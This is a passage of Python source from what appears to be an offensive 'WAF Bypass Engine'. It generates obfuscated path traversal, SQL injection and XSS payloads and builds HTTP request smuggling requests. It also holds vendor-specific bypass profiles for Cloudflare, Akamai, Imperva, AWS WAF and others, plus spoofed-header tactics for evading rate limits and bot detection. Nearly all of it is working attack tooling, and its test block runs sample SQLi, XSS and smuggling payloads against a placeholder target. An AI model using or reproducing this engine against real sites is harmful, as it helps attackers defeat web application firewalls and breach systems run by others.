    def _path_traversal_mutations(self, payload: str) -> List[str]:
        """Path traversal specific mutations."""
        mutations = []
        
        # Encoding variations
        mutations.append(payload.replace('../', '..%2f'))
        mutations.append(payload.replace('../', '%2e%2e/'))
        mutations.append(payload.replace('../', '%2e%2e%2f'))
        mutations.append(payload.replace('../', '..%252f'))
        mutations.append(payload.replace('../', '%252e%252e%252f'))
        
        # Unicode variations
        mutations.append(payload.replace('../', '..%c0%af'))
        mutations.append(payload.replace('../', '..%c1%9c'))
        
        # Null byte
        mutations.append(payload + '\x00')
        mutations.append(payload + '%00')
        mutations.append(payload + '\x00.jpg')
        
        # Double encoding
        mutations.append(payload.replace('../', '....//'))
        mutations.append(payload.replace('../', '..../'))
        
        # Windows variations
        mutations.append(payload.replace('../', '..\\'))
        mutations.append(payload.replace('/', '\\'))
        
        return mutations
    
    def record_success(self, original: str, mutation: str,
                       waf_vendor: WAFVendor):
        """Record successful mutation for learning."""
        self.successful_mutations.append({
            "original": original,
            "mutation": mutation,
            "waf": waf_vendor.value,
            "timestamp": datetime.now().isoformat()
        })
    
    def get_success_rate(self, waf_vendor: WAFVendor = None) -> float:
        """Get success rate for mutations."""
        if not self.mutation_history:
            return 0.0
        
        total = len(self.mutation_history)
        if waf_vendor:
            total = sum(1 for m in self.mutation_history if m["waf"] == waf_vendor.value)
            successes = sum(1 for s in self.successful_mutations if s["waf"] == waf_vendor.value)
        else:
            successes = len(self.successful_mutations)
        
        return successes / total if total > 0 else 0.0


# ============================================================================
# WAF Bypass Engine (Main Class)
# ============================================================================

class WAFBypassEngine:
    """
    Main WAF Bypass Engine combining all techniques.
    """
    
    # Pre-defined WAF profiles
    WAF_PROFILES = {
        WAFVendor.CLOUDFLARE: WAFProfile(
            vendor=WAFVendor.CLOUDFLARE,
            name="Cloudflare",
            detection_patterns=["cf-ray", "__cfduid", "cloudflare"],
            effective_techniques=[
                BypassTechnique.UNICODE_NORMALIZATION,
                BypassTechnique.CHUNKED_MUTATION,
                BypassTechnique.HEADER_INJECTION,
                BypassTechnique.AI_MUTATION
            ],
            blocked_patterns=["<script>", "union select", "../", "etc/passwd"],
            rate_limit=100,
            bot_detection=True,
            javascript_challenge=True,
            captcha=True,
            ml_detection=True
        ),
        WAFVendor.AKAMAI: WAFProfile(
            vendor=WAFVendor.AKAMAI,
            name="Akamai Kona",
            detection_patterns=["ak_bmsc", "akamai"],
            effective_techniques=[
                BypassTechnique.HTTP2_CL_SMUGGLING,
                BypassTechnique.DOUBLE_URL_ENCODE,
                BypassTechnique.HPP_DUPLICATE,
                BypassTechnique.COMMENT_INJECTION
            ],
            blocked_patterns=["xss", "sql injection", "command injection"],
            rate_limit=50,
            bot_detection=True,
            javascript_challenge=False,
            captcha=True,
            ml_detection=True
        ),
        WAFVendor.IMPERVA: WAFProfile(
            vendor=WAFVendor.IMPERVA,
            name="Imperva Incapsula",
            detection_patterns=["incap_ses", "visid_incap"],
            effective_techniques=[
                BypassTechnique.TE_CL_DESYNC,
                BypassTechnique.MIXED_ENCODING,
                BypassTechnique.CASE_SWITCHING,
                BypassTechnique.WHITESPACE_MANIPULATION
            ],
            blocked_patterns=["<script", "onerror", "onload", "union"],
            rate_limit=60,
            bot_detection=True,
            javascript_challenge=True,
            captcha=True,
            ml_detection=False
        ),
        WAFVendor.AWS_WAF: WAFProfile(
            vendor=WAFVendor.AWS_WAF,
            name="AWS WAF",
            detection_patterns=["x-amzn-requestid", "aws"],
            effective_techniques=[
                BypassTechnique.OVERLONG_UTF8,
                BypassTechnique.CHUNKED_EXTENSION,
                BypassTechnique.JSON_POLLUTION,
                BypassTechnique.NULL_BYTE_INJECTION
            ],
            blocked_patterns=["sqli", "xss", "rce"],
            rate_limit=2000,
            bot_detection=False,
            javascript_challenge=False,
            captcha=False,
            ml_detection=True
        ),
        WAFVendor.MODSECURITY: WAFProfile(
            vendor=WAFVendor.MODSECURITY,
            name="ModSecurity",
            detection_patterns=["mod_security", "modsecurity"],
            effective_techniques=[
                BypassTechnique.UTF7_ENCODING,
                BypassTechnique.CONCATENATION_BYPASS,
                BypassTechnique.HPP_ARRAY,
                BypassTechnique.DOUBLE_URL_ENCODE
            ],
            blocked_patterns=["sql", "xss", "rfi", "lfi"],
            rate_limit=None,
            bot_detection=False,
            javascript_challenge=False,
            captcha=False,
            ml_detection=False
        ),
        WAFVendor.F5_BIG_IP: WAFProfile(
            vendor=WAFVendor.F5_BIG_IP,
            name="F5 BIG-IP ASM",
            detection_patterns=["bigipserver", "f5"],
            effective_techniques=[
                BypassTechnique.HTTP2_TE_SMUGGLING,
                BypassTechnique.XML_POLLUTION,
                BypassTechnique.HTML_ENTITY,
                BypassTechnique.HOST_OVERRIDE
            ],
            blocked_patterns=["attack", "malicious", "injection"],
            rate_limit=100,
            bot_detection=True,
            javascript_challenge=False,
            captcha=True,
            ml_detection=True
        )
    }
    
    def __init__(self, config: Dict = None):
        """
        Initialize WAF Bypass Engine.
        
        Args:
            config: Optional configuration dictionary
        """
        self.config = config or {}
        
        # Initialize sub-engines
        self.fingerprinter = WAFFingerprinter()
        self.encoding_engine = EncodingEngine()
        self.smuggling_engine = HTTPSmugglingEngine()
        self.hpp_engine = ParameterPollutionEngine()
        self.ai_mutator = AIPayloadMutator()
        
        # State
        self.current_waf: Optional[WAFVendor] = None
        self.current_profile: Optional[WAFProfile] = None
        self.bypass_attempts: List[Dict] = []
        self.successful_bypasses: List[Dict] = []
    
    def fingerprint_waf(self, response_headers: Dict[str, str],
                        response_body: str,
                        status_code: int,
                        url: str = "") -> WAFFingerprint:
        """
        Fingerprint WAF from HTTP response.
        """
        fingerprint = self.fingerprinter.fingerprint(
            response_headers, response_body, status_code, url
        )
        
        self.current_waf = fingerprint.vendor
        self.current_profile = self.WAF_PROFILES.get(fingerprint.vendor)
        
        return fingerprint
    
    def set_target_waf(self, vendor: WAFVendor):
        """Manually set target WAF."""
        self.current_waf = vendor
        self.current_profile = self.WAF_PROFILES.get(vendor)
    
    def generate_bypass_payloads(self, payload: str,
                                  attack_type: AttackType,
                                  techniques: List[BypassTechnique] = None,
                                  max_payloads: int = 20) -> List[BypassPayload]:
        """
        Generate multiple bypass payloads using various techniques.
        
        Args:
            payload: Original attack payload
            attack_type: Type of attack
            techniques: Specific techniques to use (or auto-select based on WAF)
            max_payloads: Maximum number of payloads to generate
            
        Returns:
            List of BypassPayload objects
        """
        results = []
        
        # Auto-select techniques if not specified
        if not techniques:
            if self.current_profile:
                techniques = self.current_profile.effective_techniques
            else:
                techniques = list(BypassTechnique)[:10]  # Use first 10
        
        for technique in techniques:
            try:
                mutated = self._apply_technique(payload, technique, attack_type)
                
                if isinstance(mutated, list):
                    for m in mutated[:3]:  # Limit per technique
                        results.append(BypassPayload(
                            original=payload,
                            mutated=m,
                            technique=technique,
                            attack_type=attack_type,
                            encoding=technique.value,
                            success_probability=self._estimate_success(technique),
                            waf_target=self.current_waf
                        ))
                else:
                    results.append(BypassPayload(
                        original=payload,
                        mutated=mutated,
                        technique=technique,
                        attack_type=attack_type,
                        encoding=technique.value,
                        success_probability=self._estimate_success(technique),
                        waf_target=self.current_waf
                    ))
                    
            except Exception as e:
                print(f"[WAF Bypass] Technique {technique.value} failed: {e}")
        
        # Add AI mutations if available
        if BypassTechnique.AI_MUTATION in techniques or not techniques:
            ai_mutations = self.ai_mutator.mutate_payload(
                payload, attack_type, 
                self.current_waf or WAFVendor.UNKNOWN,
                self.current_profile.blocked_patterns if self.current_profile else None
            )
            for m in ai_mutations[:5]:
                results.append(BypassPayload(
                    original=payload,
                    mutated=m,
                    technique=BypassTechnique.AI_MUTATION,
                    attack_type=attack_type,
                    encoding="ai_generated",
                    success_probability=0.7,  # AI mutations typically have good success
                    waf_target=self.current_waf
                ))
        
        # Sort by success probability
        results.sort(key=lambda x: x.success_probability, reverse=True)
        
        return results[:max_payloads]
    
    def _apply_technique(self, payload: str, technique: BypassTechnique,
                         attack_type: AttackType) -> Union[str, List[str]]:
        """Apply specific bypass technique to payload."""
        
        if technique == BypassTechnique.UNICODE_NORMALIZATION:
            return self.encoding_engine.unicode_normalize(payload, aggressive=True)
        
        elif technique == BypassTechnique.DOUBLE_URL_ENCODE:
            return self.encoding_engine.double_url_encode(payload)
        
        elif technique == BypassTechnique.MIXED_ENCODING:
            return self.encoding_engine.mixed_encoding(payload)
        
        elif technique == BypassTechnique.OVERLONG_UTF8:
            return self.encoding_engine.overlong_utf8(payload).decode('latin-1')
        
        elif technique == BypassTechnique.UTF7_ENCODING:
            return self.encoding_engine.utf7_encode(payload)
        
        elif technique == BypassTechnique.UTF16_ENCODING:
            return self.encoding_engine.utf16_encode(payload)
        
        elif technique == BypassTechnique.HTML_ENTITY:
            return self.encoding_engine.html_entity_encode(payload)
        
        elif technique == BypassTechnique.CHUNKED_MUTATION:
            return self.smuggling_engine.generate_chunked_mutation(payload)
        
        elif technique == BypassTechnique.HPP_DUPLICATE:
            # Extract param=value pattern
            match = re.match(r'(\w+)=(.+)', payload)
            if match:
                param, value = match.groups()
                return self.hpp_engine.hpp_duplicate(param, "normal", value)
            return payload
        
        elif technique == BypassTechnique.CASE_SWITCHING:
            return ''.join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in payload
            )
        
        elif technique == BypassTechnique.NULL_BYTE_INJECTION:
            positions = random.sample(range(1, len(payload)), min(3, len(payload)-1))
            result = payload
            for pos in sorted(positions, reverse=True):
                result = result[:pos] + '\x00' + result[pos:]
            return result
        
        elif technique == BypassTechnique.COMMENT_INJECTION:
            if attack_type == AttackType.SQLI:
                return re.sub(r'(\s+)', r'/**/\1', payload)
            elif attack_type == AttackType.XSS:
                return payload.replace('>', '--><!-->')
            return payload
        
        elif technique == BypassTechnique.WHITESPACE_MANIPULATION:
            alternatives = ['\t', '\n', '\r', '\x0b', '\x0c']
            return payload.replace(' ', random.choice(alternatives))
        
        elif technique == BypassTechnique.CONCATENATION_BYPASS:
            if attack_type == AttackType.SQLI:
                return payload.replace("'", "'"+"||'")
            elif attack_type == AttackType.XSS:
                return payload.replace('<', '<'+'<')
            return payload
        
        # Default: return original
        return payload
    
    def _estimate_success(self, technique: BypassTechnique) -> float:
        """Estimate success probability for technique against current WAF."""
        base_success = 0.5
        
        if self.current_profile:
            if technique in self.current_profile.effective_techniques:
                base_success = 0.8
            else:
                base_success = 0.3
        
        # Adjust based on historical success
        if self.successful_bypasses:
            same_technique = [b for b in self.successful_bypasses 
                           if b.get("technique") == technique.value]
            if same_technique:
                base_success = min(0.95, base_success + 0.1 * len(same_technique))
        
        return base_success
    
    def generate_smuggling_request(self, smuggled_path: str,
                                    host: str,
                                    technique: BypassTechnique = BypassTechnique.CL_TE_DESYNC
                                    ) -> SmugglingRequest:
        """
        Generate HTTP smuggling request.
        
        Args:
            smuggled_path: Path to smuggle
            host: Target host
            technique: Smuggling technique
            
        Returns:
            SmugglingRequest object
        """
        if technique == BypassTechnique.CL_TE_DESYNC:
            return self.smuggling_engine.generate_cl_te_smuggle(smuggled_path, host)
        elif technique == BypassTechnique.TE_CL_DESYNC:
            return self.smuggling_engine.generate_te_cl_smuggle(smuggled_path, host)
        elif technique == BypassTechnique.TE_TE_DESYNC:
            return self.smuggling_engine.generate_te_te_smuggle(smuggled_path, host)
        elif technique == BypassTechnique.HTTP2_H2C_SMUGGLING:
            return self.smuggling_engine.generate_h2c_smuggle(smuggled_path, host)
        else:
            return self.smuggling_engine.generate_cl_te_smuggle(smuggled_path, host)
    
    def generate_rate_limit_bypass(self, request_count: int = 100) -> Dict[str, Any]:
        """
        Generate rate limit bypass strategies.
        
        Returns:
            Dictionary with bypass strategies
        """
        strategies = {
            "header_rotation": [
                {"X-Forwarded-For": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"},
                {"X-Real-IP": f"192.168.{random.randint(0,255)}.{random.randint(0,255)}"},
                {"X-Originating-IP": f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(0,255)}"},
                {"X-Client-IP": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"},
                {"CF-Connecting-IP": f"192.168.{random.randint(0,255)}.{random.randint(0,255)}"},
                {"True-Client-IP": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"},
            ],
            "user_agent_rotation": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            ],
            "timing_strategies": {
                "random_delay": {"min_ms": 100, "max_ms": 2000},
                "exponential_backoff": {"base_ms": 500, "multiplier": 1.5},
                "jitter": {"percent": 30}
            },
            "path_variations": [
                "/",
                "/./",
                "//",
                "/;/",
                "/.;/",
            ],
            "method_variations": [
                "GET", "POST", "HEAD", "OPTIONS", "PUT"
            ]
        }
        
        return strategies
    
    def generate_bot_bypass_headers(self) -> Dict[str, str]:
        """Generate headers to bypass bot detection."""
        return {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            ]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-CH-UA": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "Cache-Control": "max-age=0",
        }
    
    def record_bypass_attempt(self, payload: BypassPayload, success: bool):
        """Record bypass attempt for learning."""
        attempt = {
            "payload": payload.mutated,
            "original": payload.original,
            "technique": payload.technique.value,
            "attack_type": payload.attack_type.value,
            "waf": self.current_waf.value if self.current_waf else "unknown",
            "success": success,
            "timestamp": datetime.now().isoformat()
        }
        
        self.bypass_attempts.append(attempt)
        
        if success:
            self.successful_bypasses.append(attempt)
            self.ai_mutator.record_success(
                payload.original, payload.mutated,
                self.current_waf or WAFVendor.UNKNOWN
            )
    
    def get_bypass_stats(self) -> Dict[str, Any]:
        """Get bypass statistics."""
        total = len(self.bypass_attempts)
        successful = len(self.successful_bypasses)
        
        # Group by technique
        technique_stats = {}
        for attempt in self.bypass_attempts:
            tech = attempt["technique"]
            if tech not in technique_stats:
                technique_stats[tech] = {"total": 0, "success": 0}
            technique_stats[tech]["total"] += 1
            if attempt["success"]:
                technique_stats[tech]["success"] += 1
        
        # Calculate success rates
        for tech, stats in technique_stats.items():
            stats["rate"] = stats["success"] / stats["total"] if stats["total"] > 0 else 0
        
        return {
            "total_attempts": total,
            "successful": successful,
            "success_rate": successful / total if total > 0 else 0,
            "by_technique": technique_stats,
            "current_waf": self.current_waf.value if self.current_waf else None,
            "ai_success_rate": self.ai_mutator.get_success_rate()
        }
    
    def get_waf_profile(self, vendor: WAFVendor = None) -> Optional[WAFProfile]:
        """Get WAF profile."""
        if vendor:
            return self.WAF_PROFILES.get(vendor)
        return self.current_profile
    
    def list_waf_vendors(self) -> List[Dict[str, Any]]:
        """List all known WAF vendors with their profiles."""
        return [
            {
                "vendor": vendor.value,
                "name": profile.name,
                "effective_techniques": [t.value for t in profile.effective_techniques],
                "features": {
                    "bot_detection": profile.bot_detection,
                    "js_challenge": profile.javascript_challenge,
                    "captcha": profile.captcha,
                    "ml_detection": profile.ml_detection
                }
            }
            for vendor, profile in self.WAF_PROFILES.items()
        ]


# ============================================================================
# Convenience Functions
# ============================================================================

def quick_bypass(payload: str, attack_type: str = "sqli",
                 waf: str = None, max_results: int = 10) -> List[Dict]:
    """
    Quick function to generate WAF bypass payloads.
    
    Args:
        payload: Original payload
        attack_type: Type of attack (sqli, xss, rce, etc.)
        waf: Target WAF vendor (optional)
        max_results: Maximum results
        
    Returns:
        List of bypass payload dictionaries
    """
    engine = WAFBypassEngine()
    
    # Set WAF if specified
    if waf:
        try:
            vendor = WAFVendor(waf.lower())
            engine.set_target_waf(vendor)
        except ValueError:
            pass
    
    # Map attack type
    attack_map = {
        "sqli": AttackType.SQLI,
        "xss": AttackType.XSS,
        "rce": AttackType.RCE,
        "lfi": AttackType.LFI,
        "rfi": AttackType.RFI,
        "ssrf": AttackType.SSRF,
        "xxe": AttackType.XXE,
        "ssti": AttackType.SSTI,
        "path": AttackType.PATH_TRAVERSAL,
        "cmd": AttackType.COMMAND_INJECTION
    }
    attack = attack_map.get(attack_type.lower(), AttackType.SQLI)
    
    # Generate payloads
    payloads = engine.generate_bypass_payloads(payload, attack, max_payloads=max_results)
    
    return [
        {
            "original": p.original,
            "bypass": p.mutated,
            "technique": p.technique.value,
            "success_probability": round(p.success_probability, 2)
        }
        for p in payloads
    ]


def fingerprint_waf(headers: Dict, body: str, status: int = 403) -> Dict:
    """
    Quick function to fingerprint WAF.
    
    Args:
        headers: Response headers
        body: Response body
        status: Status code
        
    Returns:
        Fingerprint dictionary
    """
    fingerprinter = WAFFingerprinter()
    result = fingerprinter.fingerprint(headers, body, status)
    
    return {
        "vendor": result.vendor.value,
        "confidence": round(result.confidence, 2),
        "evidence": result.evidence,
        "features": result.features
    }


# ============================================================================
# Module Test
# ============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("WAF Bypass Engine - Test Suite")
    print("=" * 60)
    
    # Test fingerprinting
    print("\n[1] Testing WAF Fingerprinting...")
    test_headers = {
        "cf-ray": "8a1234567890-SJC",
        "cf-cache-status": "DYNAMIC",
        "server": "cloudflare"
    }
    test_body = "Attention Required! | Cloudflare"
    
    result = fingerprint_waf(test_headers, test_body, 403)
    print(f"    Detected WAF: {result['vendor']}")
    print(f"    Confidence: {result['confidence']}")
    print(f"    Evidence: {result['evidence']}")
    
    # Test bypass generation
    print("\n[2] Testing Bypass Generation...")
    
    sqli_payload = "' OR 1=1--"
    bypasses = quick_bypass(sqli_payload, "sqli", "cloudflare", 5)
    print(f"    Original: {sqli_payload}")
    print("    Bypasses:")
    for i, b in enumerate(bypasses, 1):
        print(f"      {i}. [{b['technique']}] {b['bypass'][:60]}...")
    
    # Test XSS bypass
    print("\n[3] Testing XSS Bypass...")
    xss_payload = "<script>alert(1)</script>"
    bypasses = quick_bypass(xss_payload, "xss", "akamai", 5)
    print(f"    Original: {xss_payload}")
    print("    Bypasses:")
    for i, b in enumerate(bypasses, 1):
        print(f"      {i}. [{b['technique']}] {b['bypass'][:60]}...")
    
    # Test HTTP smuggling
    print("\n[4] Testing HTTP Smuggling...")
    engine = WAFBypassEngine()
    smuggle = engine.generate_smuggling_request("/admin", "target.com")
    print(f"    Technique: {smuggle.technique.value}")
    print(f"    Headers: {smuggle.headers}")
    
    # Test encoding engine
    print("\n[5] Testing Encoding Engine...")
    enc = EncodingEngine()
    test = "<script>"
    print(f"    Original: {test}")
    print(f"    Unicode: {enc.unicode_normalize(test)}")
    print(f"    Double URL: {enc.double_url_encode(test)}")
    print(f"    HTML Entity: {enc.html_entity_encode(test)}")
    
    # List WAF vendors
    print("\n[6] Supported WAF Vendors:")
    for waf in engine.list_waf_vendors():
        print(f"    - {waf['name']} ({waf['vendor']})")
    
    # PRO Features
    print("\n[7] PRO Features:")
    try:
        from evasion.waf_bypass_pro import get_pro_engines, enable_http3_quic_support
        
        if enable_http3_quic_support():
            print("     HTTP/3 QUIC Smuggling: ENABLED")
        else:
            print("     HTTP/3 QUIC Smuggling: Install aioquic")
        
        pro_engines = get_pro_engines()
        print("     GraphQL AI Inference Engine: ENABLED")
        print("     WAF Rule Learning: ENABLED")
        print("\n    [PRO] Rating: 10/10 - Enterprise Grade")
    except ImportError:
        print("     PRO features not available")
    
    print("\n" + "=" * 60)
    print("WAF Bypass Engine ready!")
    print("=" * 60)
